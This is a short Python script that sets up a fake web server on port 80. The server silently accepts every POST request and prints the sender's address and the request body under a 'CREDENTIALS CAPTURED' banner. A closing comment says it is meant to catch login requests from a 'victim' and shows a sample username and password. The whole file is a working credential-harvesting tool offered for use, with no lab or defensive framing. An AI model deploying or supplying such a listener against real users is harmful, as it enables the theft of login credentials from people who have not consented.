from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode(errors='ignore')

        print("\n=== CREDENTIALS CAPTURED ===")
        print(f"From: {self.client_address[0]}")
        print(f"Path: {self.path}")
        print(body)
        print("===========================\n")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, *args):
        return

HTTPServer(("0.0.0.0", 80), Handler).serve_forever()


# from venv run with: python fake_http.py
# not from venv     : python3 fake_http.py

# Captures POST requests from victim like:
# curl -X POST http://example.com/login -d "username=alice&password=secret123"